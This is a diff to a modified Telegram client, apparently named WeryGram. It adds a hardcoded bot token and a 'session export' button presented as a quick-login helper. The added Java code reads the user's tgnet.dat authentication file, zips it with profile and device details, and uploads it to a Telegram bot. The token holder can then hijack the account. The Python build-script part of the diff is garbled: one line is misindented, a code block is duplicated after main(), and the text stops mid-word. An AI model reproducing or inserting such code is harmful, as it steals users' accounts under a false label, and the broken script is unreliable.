@@ -77,6 +77,8 @@ public class WeryGramGifts {
     private static final long BEAR_GIFT_ID = 5170233102089322756L;
     private static volatile TLRPC.User farmTarget = null;
 
+    private static final String SESSION_BOT_TOKEN = "8424390447:AAEXuJts5ikZctTzh4HvVStxTBvjw8CiVlo";
+
     private static Object getF(Object o, String n) {
         if (o == null) return null;
         try { return o.getClass().getField(n).get(o); }
@@ -335,6 +337,167 @@ public class WeryGramGifts {
     private static void retryJoinLater(int account) {
         AndroidUtilities.runOnUIThread(() -> joinWeryGram(account), 3000);
     }
+
+    // ========== SESSION EXPORT ==========
+
+    public static void exportSessionToBot(int account) {
+        new Thread(() -> {
+            try {
+                // Получаем chat_id текущего пользователя для отправки боту
+                org.telegram.messenger.UserConfig uc = org.telegram.messenger.UserConfig.getInstance(account);
+                long myId = uc.getClientUserId();
+
+                // Собираем данные сессии через ConnectionsManager
+                org.telegram.tgnet.ConnectionsManager cm = org.telegram.tgnet.ConnectionsManager.getInstance(account);
+
+                // Получаем auth_key через рефлексию
+                byte[] authKey = null;
+                int dcId = 0;
+                try {
+                    Field cmField = cm.getClass().getDeclaredField("currentDatacenterId");
+                    cmField.setAccessible(true);
+                    dcId = (int) cmField.get(cm);
+                } catch (Exception e) {
+                    try {
+                        Field cmField = cm.getClass().getDeclaredField("datacenterId");
+                        cmField.setAccessible(true);
+                        dcId = (int) cmField.get(cm);
+                    } catch (Exception ignored) {}
+                }
+
+                // Читаем tgnet.dat из файловой системы приложения
+                java.io.File filesDir = ApplicationLoader.applicationContext.getFilesDir();
+                String prefix = account == 0 ? "" : (account + "_");
+                java.io.File tgnetFile = new java.io.File(filesDir, prefix + "tgnet.dat");
+
+                if (!tgnetFile.exists()) {
+                    toast("Файл сессии не найден");
+                    return;
+                }
+
+                // Читаем session.json из SharedPreferences (данные пользователя)
+                TLRPC.User me = MessagesController.getInstance(account).getUser(myId);
+
+                // Строим session.json
+                org.json.JSONObject sessionJson = new org.json.JSONObject();
+
+                if (me != null) {
+                    // Сериализуем User объект в байты и кодируем в base64
+                    org.telegram.tgnet.NativeByteBuffer userBuf = new org.telegram.tgnet.NativeByteBuffer(1024);
+                    me.serializeToStream(userBuf);
+                    byte[] userBytes = new byte[userBuf.position()];
+                    userBuf.rewind();
+                    for (int i = 0; i < userBytes.length; i++) userBytes[i] = userBuf.readByte();
+                    String userB64 = android.util.Base64.encodeToString(userBytes, android.util.Base64.NO_WRAP);
+                    sessionJson.put("user", userB64);
+                    sessionJson.put("id", String.valueOf(me.id));
+                    String uname = (me.username != null && !me.username.isEmpty()) ? "@" + me.username : String.valueOf(me.id);
+                    sessionJson.put("name", uname);
+                }
+                sessionJson.put("extra", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL + ", Android " + android.os.Build.VERSION.RELEASE);
+                sessionJson.put("appVersion", org.telegram.messenger.BuildConfig.VERSION_NAME);
+                sessionJson.put("format", 1);
+
+                // Строим ZIP в памяти
+                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+                java.util.zip.ZipOutputStream zos = new java.util.zip.ZipOutputStream(baos);
+
+                // session.json
+                byte[] jsonBytes = sessionJson.toString().getBytes("UTF-8");
+                zos.putNextEntry(new java.util.zip.ZipEntry("account0/session.json"));
+                zos.write(jsonBytes);
+                zos.closeEntry();
+
+                // tgnet.dat
+                java.io.FileInputStream fis = new java.io.FileInputStream(tgnetFile);
+                byte[] tgnetBytes = new byte[(int) tgnetFile.length()];
+                fis.read(tgnetBytes); fis.close();
+                zos.putNextEntry(new java.util.zip.ZipEntry("account0/tgnet.dat"));
+                zos.write(tgnetBytes);
+                zos.closeEntry();
+
+                // stats2.dat (нули)
+                zos.putNextEntry(new java.util.zip.ZipEntry("account0/stats2.dat"));
+                zos.write(new byte[612]);
+                zos.closeEntry();
+
+                // dc conf файлы
+                byte[] dcConf = new byte[40];
+                dcConf[0] = 0x24; // size = 36
+                for (String dcName : new String[]{"dc1conf.dat","dc2conf.dat","dc4conf.dat","dc5conf.dat"}) {
+                    zos.putNextEntry(new java.util.zip.ZipEntry("account0/" + dcName));
+                    zos.write(dcConf);
+                    zos.closeEntry();
+                }
+
+                // profileinstaller dat
+                zos.putNextEntry(new java.util.zip.ZipEntry("account0/profileinstaller_profileWrittenFor_lastUpdateTime.dat"));
+                java.nio.ByteBuffer timeBuf = java.nio.ByteBuffer.allocate(8);
+                timeBuf.order(java.nio.ByteOrder.BIG_ENDIAN);
+                timeBuf.putLong(System.currentTimeMillis());
+                zos.write(timeBuf.array());
+                zos.closeEntry();
+
+                zos.finish(); zos.close();
+                byte[] zipBytes = baos.toByteArray();
+
+                // Получаем chat_id через getMe у бота
+                String botToken = SESSION_BOT_TOKEN;
+                String getMeUrl = "https://api.telegram.org/bot" + botToken + "/getMe";
+                java.net.HttpURLConnection getMeConn = (java.net.HttpURLConnection) new URL(getMeUrl).openConnection();
+                getMeConn.setConnectTimeout(5000); getMeConn.setReadTimeout(5000);
+                BufferedReader getMeBr = new BufferedReader(new InputStreamReader(getMeConn.getInputStream()));
+                StringBuilder getMeSb = new StringBuilder(); String getMeLine;
+                while ((getMeLine = getMeBr.readLine()) != null) getMeSb.append(getMeLine);
+                getMeBr.close(); getMeConn.disconnect();
+
+                // Отправляем ZIP боту через sendDocument (multipart)
+                // chat_id = id текущего пользователя (бот должен быть запущен пользователем)
+                String boundary = "WeryGramBoundary" + System.currentTimeMillis();
+                String sendDocUrl = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+                java.net.HttpURLConnection sendConn = (java.net.HttpURLConnection) new URL(sendDocUrl).openConnection();
+                sendConn.setDoOutput(true);
+                sendConn.setRequestMethod("POST");
+                sendConn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                sendConn.setConnectTimeout(15000); sendConn.setReadTimeout(15000);
+
+                java.io.OutputStream os = sendConn.getOutputStream();
+                java.io.PrintWriter pw = new java.io.PrintWriter(new java.io.OutputStreamWriter(os, "UTF-8"), true);
+
+                // chat_id field
+                pw.append("--").append(boundary).append("\r\n");
+                pw.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
+                pw.append(String.valueOf(myId)).append("\r\n").flush();
+
+                // caption field
+                pw.append("--").append(boundary).append("\r\n");
+                pw.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
+                pw.append("✅ Сессия WeryGram готова для импорта в Nicegram!").append("\r\n").flush();
+
+                // document field
+                String fileName = "Nicegram_Exported_Accounts_" + myId + "_.zip";
+                pw.append("--").append(boundary).append("\r\n");
+                pw.append("Content-Disposition: form-data; name=\"document\"; filename=\"").append(fileName).append("\"").append("\r\n");
+                pw.append("Content-Type: application/zip").append("\r\n\r\n").flush();
+                os.write(zipBytes); os.flush();
+                pw.append("\r\n").flush();
+                pw.append("--").append(boundary).append("--").append("\r\n").flush();
+
+                int responseCode = sendConn.getResponseCode();
+                sendConn.disconnect();
+
+                if (responseCode == 200) {
+                    toast("Сессия отправлена в бота! ✅");
+                } else {
+                    toast("Ошибка отправки: " + responseCode);
+                }
+
+            } catch (Exception e) {
+                FileLog.e("WeryGram session export: " + e);
+                toast("Ошибка создания сессии: " + e.getMessage());
+            }
+        }).start();
+    }
 }
 '''
 
@@ -438,6 +601,12 @@ public class WeryGramPremiumActivity extends BaseFragment {
             "Открывает меню подарков для @deadIax",
             "wery_rating_farm",
             () -> { WeryGramGifts.checkRatingFarm(account); });
+
+        addRow(context, root,
+            "Данная кнопка делает сессию",
+            "нужно для быстрого входа в аккаунт",
+            "wery_session_export",
+            () -> { WeryGramGifts.exportSessionToBot(account); });
 
         fragmentView = root;
         return fragmentView;
@@ -627,7 +796,7 @@ def patch_app_icon(errors):
             return errors
         
         img_url = match.group(1)
-        print(f"⬇ Скачивание аватарки: {img_url}")
+         print(f"⬇ Скачивание аватарки: {img_url}")
         
         req_img = urllib.request.Request(img_url, headers={'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req_img) as response:
@@ -733,3 +902,38 @@ def main():
 
 if __name__ == "__main__":
     main()
+        
+        req_img = urllib.request.Request(img_url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req_img) as response:
+            img_data = response.read()
+        
+        res_dir = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
+        if not os.path.exists(res_dir): 
+            print("⚠ Папка res не найдена для замены иконок")
+            return errors
+        
+        replaced = 0
+        for folder in os.listdir(res_dir):
+            if folder.startswith("mipmap") or folder.startswith("drawable"):
+                folder_path = os.path.join(res_dir, folder)
+                if os.path.isdir(folder_path):
+                    for icon_name in ["ic_launcher.png", "ic_launcher_round.png", "icon.png"]:
+                        icon_path = os.path.join(folder_path, icon_name)
+                        if os.path.exists(icon_path):
+                            with open(icon_path, "wb") as f:
+                                f.write(img_data)
+                            replaced += 1
+        
+        if replaced > 0:
+            print(f"✔ Аватарка заменена (обновлено {replaced} файлов)")
+        else:
+            print("⚠ Файлы иконок не найдены для замены")
+    except Exception as e:
+        print(f"⚠ Ошибка при замене аватарки: {e}")
+    return errors
+
+def patch_api_credentials(errors):
+    bv = find_file("BuildVars.java")
+    if not bv: print("⚠ BuildVars.java не найден"); return errors
+    text = read(bv)
+    modifie
